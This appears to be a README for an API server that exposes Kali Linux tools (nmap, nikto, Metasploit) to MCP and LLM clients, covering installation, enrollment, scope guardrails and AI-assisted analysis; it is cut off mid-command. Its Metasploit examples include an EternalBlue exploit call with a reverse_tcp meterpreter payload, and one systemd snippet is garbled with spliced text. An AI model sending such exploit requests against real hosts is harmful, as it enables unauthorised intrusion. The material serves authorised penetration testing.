# DARK MATER | MCP Kali Server v2.0

<div align="center">
  <img src="https://raw.githubusercontent.com/khalilpreview/M7yapp9sColl3c1oncdn/refs/heads/main/image%20(35).png" alt="DARK MATER MCP Kali Server" width="100%" />
</div>

<div align="center">
  <h3>🔒 Production-Ready Security Testing Platform</h3>
  <p>A powerful Model Context Protocol (MCP) server for security testing with Kali Linux tools</p>
  <p><strong>🏢 Powered by <a href="https://zyniq.solutions">Zyniq Solutions</a></strong></p>
  
  <!-- Technology Stack -->
  <p>
    <img src="https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python" />
    <img src="https://img.shields.io/badge/FastAPI-009688?style=for-the-badge&logo=fastapi&logoColor=white" alt="FastAPI" />
    <img src="https://img.shields.io/badge/Kali_Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white" alt="Kali Linux" />
    <img src="https://img.shields.io/badge/ngrok-140648?style=for-the-badge&logo=ngrok&logoColor=white" alt="ngrok" />
    <img src="https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white" alt="Docker" />
    <img src="https://img.shields.io/badge/systemd-231F20?style=for-the-badge&logo=linux&logoColor=white" alt="systemd" />
  </p>
  
  <!-- Status Badges -->
  <p>
    <img src="https://img.shields.io/badge/Version-2.0-brightgreen?style=flat-square" alt="Version" />
    <img src="https://img.shields.io/badge/Status-Production%20Ready-success?style=flat-square" alt="Status" />
    <img src="https://img.shields.io/badge/License-Commercial-gold?style=flat-square" alt="License" />
    <img src="https://img.shields.io/badge/Access-Private-red?style=flat-square" alt="Access" />
    <img src="https://img.shields.io/badge/Security-Tested-orange?style=flat-square" alt="Security" />
  </p>
</div>

---

## 🚀 **Key Features**

<div align="center">
  <table>
    <tr>
      <td align="center" width="33%">
        <img src="https://img.icons8.com/color/96/000000/security-shield-green.png" alt="Security" width="64"/>
        <h4>🔐 Secure Authentication</h4>
        <p>Enrollment-based API key system with bearer token authentication</p>
      </td>
      <td align="center" width="33%">
        <img src="https://img.icons8.com/color/96/000000/api-settings.png" alt="API" width="64"/>
        <h4>🛡️ Schema Validation</h4>
        <p>JSON Schema validation for all tool arguments and responses</p>
      </td>
      <td align="center" width="33%">
        <img src="https://img.icons8.com/color/96/000000/target.png" alt="Targeting" width="64"/>
        <h4>🎯 Smart Guardrails</h4>
        <p>CIDR-based targeting with destructive operation controls</p>
      </td>
    </tr>
    <tr>
      <td align="center">
        <img src="https://img.icons8.com/color/96/000000/archive.png" alt="Storage" width="64"/>
        <h4>📦 Artifact Storage</h4>
        <p>Automatic storage and parsing of tool outputs with summaries</p>
      </td>
      <td align="center">
        <img src="https://img.icons8.com/color/96/000000/brain.png" alt="Memory" width="64"/>
        <h4>🧠 Memory Hooks</h4>
        <p>Lightweight observation recording for analysis patterns</p>
      </td>
      <td align="center">
        <img src="https://img.icons8.com/color/96/000000/network.png" alt="Network" width="64"/>
        <h4>🌐 Remote Access</h4>
        <p>Ngrok tunneling support for secure remote connectivity</p>
      </td>
    </tr>
  </table>
</div>

### 🏗️ **Architecture Highlights**
- 🌐 **HTTP API**: RESTful endpoints for DARK MATER MCP Client integration
- 🔧 **Systemd Integration**: Production-ready service with automatic startup
- 🔒 **Optional TLS/mTLS**: Support for encrypted connections
- ⚡ **High Performance**: Async FastAPI backend with concurrent tool execution

---

## 🚀 **Quick Start Guide**

<div align="center">
  <img src="https://img.shields.io/badge/Setup_Time-5_minutes-brightgreen?style=for-the-badge" alt="Setup Time" />
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge" alt="Difficulty" />
</div>

### 🎯 **Easy Installation & Startup**

<div align="center">
  <table>
    <tr>
      <td align="center" width="50%">
        <h4>🎯 Option 1: Automated Installation (Recommended)</h4>
        <img src="https://img.icons8.com/color/64/000000/rocket.png" alt="Rocket" width="48"/>
        <br><br>
        <strong>1. Install the server</strong> (requires root):
        <pre><code>curl -sSL https://raw.githubusercontent.com/khalilpreview/MCP-Kali-Server/main/install.sh | sudo bash</code></pre>
        <strong>2. Start with the CLI tool</strong>:
        <pre><code>sudo dark-mater_kali-mcp start-server</code></pre>
      </td>
      <td align="center" width="50%">
        <h4>⚙️ Option 2: Manual Installation</h4>
        <img src="https://img.icons8.com/color/64/000000/settings.png" alt="Settings" width="48"/>
        <br><br>
        For advanced users or custom deployments
        <br><br>
        <a href="#option-2-manual-installation-if-online-installer-has-issues">📖 See detailed manual installation steps below</a>
      </td>
    </tr>
  </table>
</div>

---

### ⚙️ **Option 2: Manual Installation** (If online installer has issues)
1. **Clone the repository**:
   ```bash
   # Create directories and user
   sudo useradd --system --home-dir /opt/mcp-kali-server --shell /bin/false mcpserver || true
   sudo mkdir -p /opt/mcp-kali-server
   
   # Clone repository first
   sudo rm -rf /opt/mcp-kali-server/* 2>/dev/null || true
   sudo git clone https://github.com/khalilpreview/MCP-Kali-Server.git /tmp/mcp-kali-server
   sudo cp -r /tmp/mcp-kali-server/* /opt/mcp-kali-server/
   sudo rm -rf /tmp/mcp-kali-server
   sudo chown -R mcpserver:mcpserver /opt/mcp-kali-server
   ```

   **Important**: You'll need to push the corrected files to GitHub first:
   ```bash
   # From your Windows development directory:
   git add -A
   git commit -m "Fix ngrok integration and auth dependency issues"
   git push origin main
   ```

2. **Install dependencies**:
   ```bash
   # System dependencies
   sudo apt-get update
   sudo apt-get install -y python3-pip python3-venv python3-dev build-essential git curl nmap sqlite3 ca-certificates python3-requests
   
   # Python environment
   sudo -u mcpserver python3 -m venv /opt/mcp-kali-server/venv
   sudo -u mcpserver /opt/mcp-kali-server/venv/bin/pip install -r /opt/mcp-kali-server/requirements.txt
   ```

3. **Setup configuration**:
   ```bash
   # Create config directories
   sudo mkdir -p /etc/mcp-kali /var/lib/mcp/{artifacts,memory}
   sudo chown -R mcpserver:mcpserver /var/lib/mcp
   
   # Generate enrollment token
   sudo python3 -c "
   import json, secrets, socket, datetime
   server_id = f'kali-{socket.gethostname()}-{int(datetime.datetime.now().timestamp())}'
   token = secrets.token_urlsafe(32)
   data = {'id': server_id, 'token': token, 'created': datetime.datetime.now().isoformat()}
   with open('/etc/mcp-kali/enroll.json', 'w') as f: json.dump(data, f)
   print('Enrollment token created:', data)
   "
   
   # Create scope config
   echo '{"allowed_cidrs":["10.0.0.0/8","192.168.0.0/16","172.16.0.0/12"],"allow_destructive":false}' | sudo tee /etc/mcp-kali/scope.json
   
   # Install CLI tool globally
   sudo chmod +x /opt/mcp-kali-server/dark-mater_kali-mcp
   sudo ln -sf /opt/mcp-kali-server/dark-mater_kali-mcp /usr/local/bin/dark-mater_kali-mcp
   ```

4. **Start the server**:
   ```bash
   sudo dark-mater_kali-mcp start-server
   ```

<div align="center">
  <h4>🎨 CLI Features</h4>
  <table>
    <tr>
      <td align="center">🎨</td>
      <td><strong>DARK MATER ASCII banner</strong></td>
      <td align="center">🌐</td>
      <td><strong>Interactive ngrok setup</strong></td>
    </tr>
    <tr>
      <td align="center">🚀</td>
      <td><strong>Automatic server startup</strong></td>
      <td align="center">📋</td>
      <td><strong>Enrollment information display</strong></td>
    </tr>
    <tr>
      <td align="center">🎛️</td>
      <td><strong>Interactive management menu</strong></td>
      <td align="center">📊</td>
      <td><strong>Real-time health monitoring</strong></td>
    </tr>
  </table>
</div>

---

## 🎛️ **CLI Management Tool**

<div align="center">
  <img src="https://img.icons8.com/color/96/000000/command-line.png" alt="CLI" width="64"/>
  <h4>The <code>dark-mater_kali-mcp</code> CLI tool provides comprehensive server management</h4>
</div>

<div align="center">
  <h4>✨ CLI Features Overview</h4>
</div>

<table>
  <tr>
    <td width="50%">
      <h4>🎨 Beautiful Interface</h4>
      <ul>
        <li>DARK MATER ASCII banner</li>
        <li>Colored output and progress indicators</li>
        <li>Interactive menus and prompts</li>
      </ul>
    </td>
    <td width="50%">
      <h4>🚀 Smart Automation</h4>
      <ul>
        <li>Automatic server startup</li>
        <li>Health monitoring and status checks</li>
        <li>Graceful error handling</li>
      </ul>
    </td>
  </tr>
  <tr>
    <td>
      <h4>🌐 Network Features</h4>
      <ul>
        <li>Interactive ngrok configuration</li>
        <li>Token management and validation</li>
        <li>Public URL generation</li>
      </ul>
    </td>
    <td>
      <h4>📊 Management Tools</h4>
      <ul>
        <li>Real-time enrollment status</li>
        <li>Server information display</li>
        <li>Interactive control panel</li>
      </ul>
    </td>
  </tr>
</table>

---

## 🖥️ **Server Management Commands**

<div align="center">
  <img src="https://img.icons8.com/color/64/000000/server.png" alt="Server" width="48"/>
</div>

<div align="center">
  <table>
    <tr>
      <td align="center" width="33%">
        <img src="https://img.icons8.com/color/48/000000/check-all.png" alt="Check" width="32"/>
        <h4>🔍 Check Server Status</h4>
      </td>
      <td align="center" width="33%">
        <img src="https://img.icons8.com/color/48/000000/log.png" alt="Logs" width="32"/>
        <h4>📊 View Server Logs</h4>
      </td>
      <td align="center" width="33%">
        <img src="https://img.icons8.com/color/48/000000/control-panel.png" alt="Control" width="32"/>
        <h4>🎮 Manual Control</h4>
      </td>
    </tr>
  </table>
</div>

<details>
<summary><b>🔍 Check if Server is Running</b></summary>

```bash
# Check server process
ps aux | grep kali_server | grep -v grep

# Test server connectivity
curl -sS http://localhost:5000/health

# Check server port
netstat -tlnp | grep :5000
```
</details>

<details>
<summary><b>📊 View Server Logs</b></summary>

```bash
# View live logs
tail -f /var/log/mcp-kali-server.log

# View last 50 lines
tail -50 /var/log/mcp-kali-server.log

# Search for errors
grep ERROR /var/log/mcp-kali-server.log
```
</details>

<details>
<summary><b>🎮 Manual Server Control</b></summary>

```bash
# Start server (without ngrok)
/opt/mcp-kali-server/venv/bin/python /opt/mcp-kali-server/kali_server.py --bind 0.0.0.0:5000

# Start server in background
nohup /opt/mcp-kali-server/venv/bin/python /opt/mcp-kali-server/kali_server.py --bind 0.0.0.0:5000 > /var/log/mcp-kali-server.log 2>&1 &

# Kill server process
pkill -f kali_server.py
```
</details>
  - Server restart functionality
  - Log viewing capabilities
  - Health testing
  - Artifacts management
  - Graceful shutdown

### Usage
```bash
# Start the server with interactive setup
sudo dark-mater_kali-mcp start-server

# The CLI will guide you through:
# 1. Ngrok token configuration (optional)
# 2. Server startup
# 3. Enrollment information display
# 4. Interactive management menu
```

### 🧪 **First Launch & Testing**

The server includes an automatic first-launch setup that ensures project integrity:

```bash
# First launch automatically runs comprehensive tests
python3 kali_server.py --bind 0.0.0.0:5000

# Manual test suite execution (anytime)
python3 tests/run_tests.py

# Test specific components
python3 tests/unit/test_server.py          # Unit tests
python3 tests/integration/test_server_live.py  # Integration tests  
python3 tests/acceptance/test_complete_live_enhanced.py  # End-to-end tests
```

**What happens on first launch:**
1. ✅ **Environment Validation** - Checks Python version, dependencies, project structure
2. ✅ **Comprehensive Testing** - Runs all unit, integration, and acceptance tests
3. ✅ **Project Integrity** - Validates all components are working correctly
4. ✅ **Setup Completion** - Marks setup as complete for future launches

**Test Categories:**
- **Unit Tests** - Individual component testing (schema validation, core logic)
- **Integration Tests** - API endpoints and tool integration testing
- **Acceptance Tests** - End-to-end user workflow testing
- **System Tests** - LLM integration and system-level testing

### Starting the Server

After successful first launch and testing, you have multiple ways to start the server:

#### **🎯 Recommended: CLI Tool** (Easy & Interactive)
```bash
# Start with the beautiful CLI interface
sudo dark-mater_kali-mcp start-server
```

This provides:
- Beautiful DARK MATER ASCII banner
- Interactive ngrok setup
- Automatic enrollment display
- Real-time server management

#### **⚙️ Systemd Service** (Background)
```bash
# Start as system service
sudo systemctl start mcp-kali-server
sudo systemctl status mcp-kali-server

# Enable auto-start on boot
sudo systemctl enable mcp-kali-server
```

#### **🚀 Direct Execution** (Development/Non-systemd)
```bash
# Run directly (foreground)
/opt/mcp-kali-server/venv/bin/python /opt/mcp-kali-server/kali_server.py --bind 0.0.0.0:5000

# Background with logging
nohup /opt/mcp-kali-server/venv/bin/python /opt/mcp-kali-server/kali_server.py --bind 0.0.0.0:5000 > /var/log/mcp-kali-server.log 2>&1 &

# With ngrok tunnel (background)
export NGROK_AUTHTOKEN=your_token_here
nohup /opt/mcp-kali-server/venv/bin/python /opt/mcp-kali-server/kali_server.py --bind 0.0.0.0:5000 --ngrok > /var/log/mcp-kali-server.log 2>&1 &

# Check logs
tail -f /var/log/mcp-kali-server.log
```

### 🔧 **Enhanced CLI Features**

The server includes a comprehensive CLI with enhanced authentication information:

```bash
# Display comprehensive authentication info
python3 kali_server.py --show-auth

# Show full server configuration
python3 kali_server.py --show-config

# Test connection to running server
python3 kali_server.py --test-connection

# Generate client configurations
python3 kali_server.py --generate-client-config curl        # Ready-to-use curl commands
python3 kali_server.py --generate-client-config python      # Python client code
python3 kali_server.py --generate-client-config powershell  # PowerShell commands
python3 kali_server.py --generate-client-config json        # JSON configuration

# Enhanced help with examples
python3 kali_server.py --help
```

**CLI Features:**
- 🔐 **Complete Authentication Display** - API keys, server IDs, endpoints
- 💻 **Ready-to-Use Commands** - Generated curl, Python, and PowerShell examples
- 🔍 **Connection Testing** - Validate server health and connectivity
- ⚙️ **Configuration Management** - View and validate all settings
- 📚 **Self-Documenting** - All endpoints and usage examples included
- 🎯 **Multi-Platform Support** - Works on Windows, Linux, and macOS

### Alternative: Manual Installation

```bash
# Download and run the installer
curl -sSL https://raw.githubusercontent.com/khalilpreview/MCP-Kali-Server/main/install.sh | sudo bash

# Or clone and run locally
git clone https://github.com/khalilpreview/MCP-Kali-Server.git
cd MCP-Kali-Server
sudo chmod +x install.sh
sudo ./install.sh
```

The installer will:
- Create a dedicated `mcpserver` user
- Install the server to `/opt/mcp-kali-server`
- Set up systemd service
- Generate enrollment token
- Install global CLI tool

### Optional: Enable Ngrok Tunneling

For remote access without port forwarding:

1. **Get ngrok auth token** from [ngrok dashboard](https://dashboard.ngrok.com/get-started/your-authtoken)

2. **Configure the service**:
   ```bash
   sudo systemctl edit mcp-kali-server
   ```
   Add:
   ```ini
   [Service]
   Environment="NGROK_AUTHTOKEN=your_token_here"
   ExecStart=
   ExecStart=/opt/mcp-kali-server/venv/bin/# Run in development mode
python3 kali_server.py --debug --bind 127.0.0.1:8000

# Run with ngrok tunnel for testing
python3 kali_server.py --debug --bind 127.0.0.1:8000 --ngrok --ngrok-authtoken YOUR_TOKEN
```

### Adding New Tools
   ```

3. **Restart the service**:
   ```bash
   sudo systemctl daemon-reload
   sudo systemctl restart mcp-kali-server
   ```

4. **Get the public URL**:
   ```bash
   sudo journalctl -u mcp-kali-server -f | grep "tunnel established"
   ```

### Enrollment

After installation, follow these steps to register your server:

#### Step 1 — Locate the enrollment token

The installer created this file:

```bash
/etc/mcp-kali/enroll.json
```

Check it:

```bash
cat /etc/mcp-kali/enroll.json
```

You'll see something like:

```json
{"id":"kali-host-1727890000","token":"AbCdEfGh123XYZ","created":"2025-10-02T12:00:00Z"}
```

#### Step 2 — Call the enroll endpoint

With the server running, send a POST to /enroll with that ID + token. Example:

```bash
curl -sS -X POST http://localhost:5000/enroll \
  -H "Content-Type: application/json" \
  -d '{"id":"kali-host-1727890000","token":"AbCdEfGh123XYZ","label":"Kali-Lab-1"}'
```

#### Step 3 — Get your API key

The server should respond like this:

```json
{
  "server_id": "kali-host-1727890000",
  "api_key": "3qP7eD9xL0...<long-random-key>...",
  "label": "Kali-Lab-1"
}
```

That `api_key` is what you'll use in the `Authorization: Bearer <api_key>` header for all other endpoints (`/health`, `/tools/list`, `/tools/call`, `/artifacts/...`).

#### Step 4 — Verify it works

```bash
curl -sS http://localhost:5000/health \
  -H "Authorization: Bearer <api_key>"
```

If you see `{ "ok": true, ... }`, your server is properly registered and ready.

## Docker Environment (New in v2.0)

A complete production-ready Docker Compose setup is now available:

```bash
# Build and run the server in the background
docker-compose up -d --build

# View real-time logs
docker-compose logs -f kali-api

# Stop the server
docker-compose down
```

## API Usage

### Health Check

```bash
curl -H "Authorization: Bearer YOUR_API_KEY" \
  "http://SERVER_IP:5000/health"
```

### List Available Tools

```bash
curl -H "Authorization: Bearer YOUR_API_KEY" \
  "http://SERVER_IP:5000/tools/list"
```

### Asynchronous Jobs

The server supports asynchronous tool execution for long-running tasks.

```bash
# Submit a background job
curl -X POST "http://SERVER_IP:5000/tools/jobs" \
  -H "Authorization: Bearer YOUR_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "net.scan_basic",
    "arguments": {
      "target": "192.168.1.1/24"
    }
  }'

# Check job status
curl -H "Authorization: Bearer YOUR_API_KEY" \
  "http://SERVER_IP:5000/tools/jobs/YOUR_JOB_ID"
```

### Execute Network Scan

```bash
curl -X POST "http://SERVER_IP:5000/tools/call" \
  -H "Authorization: Bearer YOUR_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "net.scan_basic",
    "arguments": {
      "target": "192.168.1.1",
      "fast": true
    }
  }'
```

### List Artifacts

```bash
curl -H "Authorization: Bearer YOUR_API_KEY" \
  "http://SERVER_IP:5000/artifacts/list?limit=10"
```

### Read Artifact

```bash
curl -H "Authorization: Bearer YOUR_API_KEY" \
  "http://SERVER_IP:5000/artifacts/read?uri=artifact://server-id/run-id/raw.xml"
```

## Configuration

### Scope Configuration

Edit `/etc/mcp-kali/scope.json` to control targeting and destructive operations:

```json
{
  "allowed_cidrs": [
    "10.0.0.0/8",
    "192.168.0.0/16", 
    "172.16.0.0/12"
  ],
  "allow_destructive": false
}
```

- `allowed_cidrs`: List of CIDR ranges that tools can target
- `allow_destructive`: Whether to allow potentially destructive operations

### TLS Configuration

Enable TLS with environment variables:

```bash
# Server TLS (HTTPS)
export MCP_TLS_CERT="/path/to/server.crt"
export MCP_TLS_KEY="/path/to/server.key"

# Mutual TLS (client certificates required)
export MCP_MTLS_CA="/path/to/ca.crt"

# Restart the service
sudo systemctl restart mcp-kali-server
```

## Available Tools

### net.scan_basic

Basic network scanning using nmap with safety constraints.

**Schema**: `/schemas/tools/net_scan_basic.json`

**Arguments**:
- `target` (required): IP address, hostname, or CIDR range
- `ports` (optional): Port specification (e.g., "80,443" or "1-1000") 
- `fast` (optional): Use fast scan mode (default: true)

**Example**:
```json
{
  "name": "net.scan_basic",
  "arguments": {
    "target": "192.168.1.0/24",
    "ports": "22,80,443",
    "fast": true
  }
}
```

### metasploit.exploit

Metasploit exploit module execution with comprehensive safety controls.

**Schema**: `/schemas/tools/metasploit_exploit.json`

**Arguments**:
- `module` (required): Metasploit exploit module path (e.g., "exploit/windows/smb/ms17_010_eternalblue")
- `target` (required): Target IP address or hostname
- `payload` (optional): Payload to use (default: "generic/shell_reverse_tcp")
- `lhost` (optional): Local host for reverse connections (default: "127.0.0.1")
- `lport` (optional): Local port for reverse connections (default: 4444)
- `rport` (optional): Remote port on target (default: 445)
- `check_only` (recommended): Only check vulnerability, don't exploit (default: true)
- `safe_mode` (recommended): Enable additional safety checks (default: true)
- `timeout` (optional): Execution timeout in seconds (default: 180)

**Safe Example (Vulnerability Check)**:
```json
{
  "name": "metasploit.exploit",
  "arguments": {
    "module": "exploit/windows/smb/ms17_010_eternalblue",
    "target": "192.168.1.100",
    "check_only": true,
    "safe_mode": true
  }
}
```

**⚠️ Advanced Example (Requires `allow_destructive: true`)**:
```json
{
  "name": "metasploit.exploit",
  "arguments": {
    "module": "exploit/windows/smb/ms17_010_eternalblue",
    "target": "192.168.1.100",
    "payload": "windows/meterpreter/reverse_tcp",
    "lhost": "192.168.1.50",
    "lport": 4444,
    "check_only": false,
    "safe_mode": false
  }
}
```

### metasploit.auxiliary

Metasploit auxiliary modules for scanning, enumeration, and reconnaissance.

**Schema**: `/schemas/tools/metasploit_auxiliary.json`

**Arguments**:
- `module` (required): Auxiliary module path (e.g., "auxiliary/scanner/smb/smb_version")
- `target` (required): Target IP address, hostname, or CIDR range
- `rport` (optional): Remote port on target system
- `threads` (optional): Number of concurrent threads (default: 10)
- `timeout` (optional): Execution timeout in seconds (default: 300)
- `options` (optional): Additional module-specific options

**Example**:
```json
{
  "name": "metasploit.auxiliary",
  "arguments": {
    "module": "auxiliary/scanner/smb/smb_version",
    "target": "192.168.1.0/24",
    "threads": 20,
    "options": {
      "ShowProgress": "true"
    }
  }
}
```

**Common Safe Auxiliary Modules**:
- `auxiliary/scanner/smb/smb_version` - SMB version detection
- `auxiliary/scanner/ssh/ssh_version` - SSH version banner
- `auxiliary/scanner/http/http_version` - HTTP server detection
- `auxiliary/scanner/discovery/arp_sweep` - ARP-based host discovery
- `auxiliary/scanner/portscan/tcp` - TCP port scanning

## Project Structure

```
mcp-kali-server/               # Project root
├── kali_server.py             # 🚀 Main server entrypoint with enhanced CLI
├── setup_first_launch.py     # 🧪 First launch setup and test runner
├── mcp_server/                # 📦 Core server package
│   ├── api.py                 # FastAPI application with all endpoints
│   ├── auth.py                # Authentication & enrollment system
│   ├── artifacts.py           # Artifact storage & parsing
│   ├── memory.py              # Memory and observation recording
│   ├── scope.py               # Security guardrails & validation
│   ├── tools.py               # Tool execution engine
│   ├── util.py                # Utilities & schema validation
│   └── schemas/               # JSON schemas for tool validation
│       └── tools/
│           ├── net_scan_basic.json      # Network scanning
│           ├── web_nikto.json           # Web vulnerability scanning
│           ├── web_dirb.json            # Directory bruteforcing
│           ├── ssl_sslyze.json          # SSL/TLS analysis
│           ├── net_masscan.json         # High-speed port scanning
│           ├── metasploit_exploit.json  # Exploit modules
│           └── metasploit_auxiliary.json # Auxiliary modules
├── mcp_tools/                 # 🔧 Extended tool implementations
│   ├── manager.py             # Tool registry and management
│   ├── ai_analyzer.py         # AI-powered result analysis
│   └── [additional tools]     # Extended security tools
├── tests/                     # 🧪 Comprehensive test suite
│   ├── run_tests.py           # Main test runner (run this first!)
│   ├── README.md              # Test documentation
│   ├── unit/                  # Unit tests for components
│   │   ├── test_server.py     # Core server functionality
│   │   ├── test_schema.py     # Schema validation testing
│   │   └── test_schema_validation.py # Validation system tests
│   ├── integration/           # API and integration tests
│   │   ├── test_server_live.py        # Live server testing
│   │   ├── test_production_api.py     # Production API testing
│   │   ├── test_llm_config.py         # LLM integration testing
│   │   └── [additional integration tests]
│   ├── acceptance/            # End-to-end acceptance tests
│   │   └── test_complete_live_enhanced.py # Full system testing
│   └── system/                # System-level tests
│       ├── test_llm_integration.py    # LLM system integration
│       └── test_llm_system.py         # LLM system functionality
├── demos/                     # 📋 Demo scripts and examples
│   ├── README.md              # Demo documentation
│   ├── demo_credentials.py    # Authentication information display
│   ├── demo_monitored_server.py # Server with comprehensive monitoring
│   ├── demo_simple_server.py  # Windows-compatible server
│   ├── demo_logs.py           # Logging demonstration
│   └── demo_llm_config.py     # LLM configuration examples
├── requirements.txt           # Python dependencies
├── install.sh                 # Installation script
└── README.md                  # This file

# Runtime Configuration & Data
~/.mcp-kali/                   # User configuration directory
├── credentials.json           # API credentials
├── enroll.json               # Enrollment tokens
├── scope.json                # Security scope configuration
├── memory/                   # Memory database
│   └── observations.db       # SQLite database
└── audit/                    # Audit logs
    └── audit.db              # Audit trail database

# Artifact Storage
/var/lib/mcp/                 # System-wide data directory
├── artifacts/               # Tool output storage
│   └── {server-id}/
│       └── {run-id}/
│           ├── raw.xml       # Raw tool output
│           ├── summary.txt   # Auto-generated summary
│           ├── parsed.json   # Parsed structured data
│           └── metadata.json # Artifact metadata
└── logs/                    # System logs
    └── server.log           # Server operation logs
```

## Service Management

```bash
# Check service status
sudo systemctl status mcp-kali-server

# View logs
sudo journalctl -u mcp-kali-server -f

# Restart service
sudo systemctl restart mcp-kali-server

# Stop service
sudo systemctl stop mcp-kali-server

# Disable service
sudo systemctl disable mcp-kali-server
```

## Testing Connection

Test the complete workflow:

```bash
#!/bin/bash
SERVER_IP="192.168.1.100"
API_KEY="your-api-key-here"

# 1. Health check
echo "Testing health endpoint..."
curl -s -H "Authorization: Bearer ${API_KEY}" \
  "http://${SERVER_IP}:5000/health" | jq

# 2. List tools
echo -e "\nListing available tools..."
curl -s -H "Authorization: Bearer ${API_KEY}" \
  "http://${SERVER_IP}:5000/tools/list" | jq

# 3. Run scan
echo -e "\nRunning network scan..."
curl -s -X POST "http://${SERVER_IP}:5000/tools/call" \
  -H "Authorization: Bearer ${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "net.scan_basic",
    "arguments": {
      "target": "127.0.0.1",
      "fast": true
    }
  }' | jq

# 4. List artifacts
echo -e "\nListing artifacts..."
curl -s -H "Authorization: Bearer ${API_KEY}" \
  "http://${SERVER_IP}:5000/artifacts/list" | jq

# 5. Check memory
echo -e "\nChecking memory stats..."
curl -s -H "Authorization: Bearer ${API_KEY}" \
  "http://${SERVER_IP}:5000/memory/stats" | jq
```

## 🤖 AI-Powered Analysis

The MCP Kali Server includes intelligent analysis capabilities powered by Ollama AI models. This feature provides automated insights, recommendations, and executive summaries of your security testing activities.

### Setup AI Analysis

1. **Install Ollama** on your system:
```bash
# Linux/WSL
curl -fsSL https://ollama.ai/install.sh | sh

# Start Ollama service
ollama serve
```

2. **Download a model** (recommended: llama2 or codellama):
```bash
ollama pull llama2
```

3. **Configure environment variables** (optional):
```bash
export OLLAMA_URL="http://localhost:11434"
export OLLAMA_MODEL="llama2"
```

### AI Analysis Features

#### 🔍 Job Analysis
Analyzes completed tool executions and provides structured insights:

```bash
# Analyze a completed job
curl -X POST -H "Authorization: Bearer ${API_KEY}" \
  "http://${SERVER_IP}:5000/tools/jobs/${JOB_ID}/analyze"
```

**Response includes**:
- **Summary**: High-level overview of what was discovered
- **Findings**: Detailed security findings and vulnerabilities  
- **Severity**: Risk assessment (Critical/High/Medium/Low/Info)
- **Recommendations**: Suggested next steps for testing
- **Context**: Security posture implications

#### 🎯 Smart Tool Suggestions
Get AI recommendations for next tools to run based on current findings:

```bash
# Get tool suggestions based on scan results  
curl -H "Authorization: Bearer ${API_KEY}" \
  "http://${SERVER_IP}:5000/tools/jobs/${JOB_ID}/suggestions"
```

**Example response**:
```json
{
  "suggestions": [
    {
      "tool": "nikto",
      "reason": "Web server detected on port 80, recommend vulnerability scanning",
      "priority": "High"
    },
    {
      "tool": "gobuster",
      "reason": "Directory enumeration to discover hidden web content",
      "priority": "Medium"
    }
  ]
}
```

#### 📋 Executive Summaries
Generate comprehensive summaries for multiple completed jobs:

```bash
# Generate executive summary for all jobs
curl -X POST -H "Authorization: Bearer ${API_KEY}" \
  -H "Content-Type: application/json" \
  "http://${SERVER_IP}:5000/tools/analysis/executive-summary"

# Generate summary for specific jobs
curl -X POST -H "Authorization: Bearer ${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"job_ids": ["job-123", "job-456", "job-789"]}' \
  "http://${SERVER_IP}:5000/tools/analysis/executive-summary"
```

**Executive Summary includes**:
- **Overview**: High-level summary of testing activities
- **Critical Findings**: Most important security issues discovered
- **Risk Assessment**: Overall security posture evaluation
- **Business Impact**: Potential organizational impact
- **Recommendations**: Priority remediation steps

### AI Configuration

The AI analysis system can be customized through environment variables:

```bash
# Ollama server URL (default: http://localhost:11434)
export OLLAMA_URL="http://your-ollama-server:11434"

# AI model to use (default: llama2)
export OLLAMA_MODEL="codellama"  # or "mistral", "neural-chat", etc.

# Analysis timeout (optional)
export AI_ANALYSIS_TIMEOUT="120"
```

### Supported Models

The system works with various Ollama models:
- **llama2**: General-purpose analysis (recommended)
- **codellama**: Enhanced code and technical analysis
- **mistral**: Fast and efficient analysis
- **neural-chat**: Conversational analysis style
- **Custom models**: Any Ollama-compatible model

### Example Workflow

1. **Run a network scan**:
```bash
JOB_ID=$(curl -X POST -H "Authorization: Bearer ${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"name":"nmap.scan","arguments":{"target":"192.168.1.100"}}' \
  "http://${SERVER_IP}:5000/tools/call" | jq -r '.job_id')
```

2. **Wait for completion and analyze**:
```bash
# Check job status
curl -H "Authorization: Bearer ${API_KEY}" \
  "http://${SERVER_IP}:5000/tools/jobs/${JOB_ID}/status"

# Analyze results with AI
curl -X POST -H "Authorization: Bearer ${API_KEY}" \
  "http://${SERVER_IP}:5000/tools/jobs/${JOB_ID}/analyze" | jq
```

3. **Get next tool suggestions**:
```bash
curl -H "Authorization: Bearer ${API_KEY}" \
  "http://${SERVER_IP}:5000/tools/jobs/${JOB_ID}/suggestions" | jq
```

4. **Generate executive summary**:
```bash
curl -X POST -H "Authorization: Bearer ${API_KEY}" \
  "http://${SERVER_IP}:5000/tools/analysis/executive-summary" | jq
```

## 🧠 LLM Configuration & Knowledge Management

The MCP Kali Server includes a comprehensive LLM configuration system that allows dashboards and AI services to store and retrieve:
- **System prompts and guardrails** for AI assistants
- **Knowledge documents and searchable chunks** for context
- **Conversation memory** per thread
- **Live server context** for dynamic responses

### LLM Configuration API

#### Get/Update LLM Configuration
```bash
# Get current LLM configuration
curl -H "Authorization: Bearer ${API_KEY}" \
  "http://${SERVER_IP}:5000/llm/config"

# Update configuration with optimistic concurrency
curl -X PUT -H "Authorization: Bearer ${API_KEY}" \
  -H "Content-Type: application/json" \
  -H "If-Match: c4f1c5f5" \
  -d '{
    "system_prompt": "You are a security testing assistant for Kali-Lab-01...",
    "guardrails": {
      "disallowed": ["secrets", "credentials"],
      "style": "concise",
      "max_tokens_hint": 200
    },
    "runtime_hints": {
      "preferred_model": "phi3:mini",
      "num_ctx": 768,
      "temperature": 0.2
    },
    "tools_allowed": ["nmap.scan", "nikto.scan"]
  }' \
  "http://${SERVER_IP}:5000/llm/config"
```

#### Knowledge Management
```bash
# Create knowledge document
DOC_ID=$(curl -X POST -H "Authorization: Bearer ${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"title": "SSH Security Guide", "source": "manual:ssh", "tags": ["ssh", "security"]}' \
  "http://${SERVER_IP}:5000/llm/knowledge/docs" | jq -r '.doc_id')

# Add text chunks
curl -X POST -H "Authorization: Bearer ${API_KEY}" \
  -H "Content-Type: application/json" \
